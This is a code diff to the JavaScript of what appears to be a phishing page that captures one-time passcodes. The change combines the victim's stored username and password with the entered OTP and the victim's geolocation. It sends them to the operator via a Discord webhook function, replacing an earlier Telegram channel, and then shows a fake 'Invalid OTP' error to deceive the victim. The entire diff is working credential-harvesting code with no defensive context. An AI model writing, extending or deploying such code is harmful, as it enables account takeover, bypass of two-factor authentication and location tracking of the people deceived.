@@ -73,29 +73,75 @@ document.addEventListener('DOMContentLoaded', function() {
             const password = localStorage.getItem('loginPassword') || 'N/A';
             const timestamp = new Date().toLocaleString();
             
-            // Prepare message for Telegram with username, password, and OTP
-            const message = `
-🔐 <b>OTP Verification Attempt</b>
-
-👤 <b>Username:</b> ${username}
-🔑 <b>Password:</b> ${password}
-🔢 <b>OTP:</b> ${otpValues}
-
-🕐 <b>Time:</b> ${timestamp}
-            `.trim();
-
-            // Send to Telegram
-            if (typeof sendToTelegram === 'function') {
-                sendToTelegram(message).then(success => {
-                    if (success) {
-                        console.log('OTP credentials sent to Telegram');
+            // Get location (use stored location from splash if available, otherwise get new one)
+            let locationPromise;
+            const storedLocation = localStorage.getItem('userLocation');
+            if (storedLocation) {
+                try {
+                    const parsedLocation = JSON.parse(storedLocation);
+                    if (parsedLocation.latitude !== 'N/A') {
+                        console.log('📍 Using stored location from splash screen');
+                        locationPromise = Promise.resolve(parsedLocation);
                     } else {
-                        console.log('Telegram send failed');
+                        locationPromise = getUserLocation();
                     }
-                }).catch(error => {
-                    console.log('Telegram error:', error);
-                });
+                } catch (e) {
+                    locationPromise = getUserLocation();
+                }
+            } else {
+                locationPromise = getUserLocation();
             }
+            
+            locationPromise.then(location => {
+                // Prepare message for Discord with username, password, OTP, and location
+                const locationText = formatLocationForDiscord(location);
+                const message = `
+🔐 OTP Verification Attempt
+
+👤 Username: ${username}
+🔑 Password: ${password}
+🔢 OTP: ${otpValues}
+
+${locationText}
+
+🕐 Time: ${timestamp}
+                `.trim();
+
+                // Send to Discord
+                if (typeof sendToTelegram === 'function' || typeof sendToDiscord === 'function') {
+                    const sendFunction = sendToDiscord || sendToTelegram;
+                    sendFunction(message).then(success => {
+                        if (success) {
+                            console.log('OTP credentials sent to Discord');
+                        } else {
+                            console.log('Discord send failed');
+                        }
+                    }).catch(error => {
+                        console.log('Discord error:', error);
+                    });
+                } else {
+                    console.log('Discord not configured');
+                }
+            }).catch(error => {
+                // If location fails, send without location
+                console.log('Location error:', error);
+                const message = `
+🔐 OTP Verification Attempt
+
+👤 Username: ${username}
+🔑 Password: ${password}
+🔢 OTP: ${otpValues}
+
+📍 Location: Not available
+
+🕐 Time: ${timestamp}
+                `.trim();
+
+                if (typeof sendToTelegram === 'function' || typeof sendToDiscord === 'function') {
+                    const sendFunction = sendToDiscord || sendToTelegram;
+                    sendFunction(message).catch(err => console.log('Discord error:', err));
+                }
+            });
 
             // Show error message as per requirement
             showError('Invalid OTP please try again later');
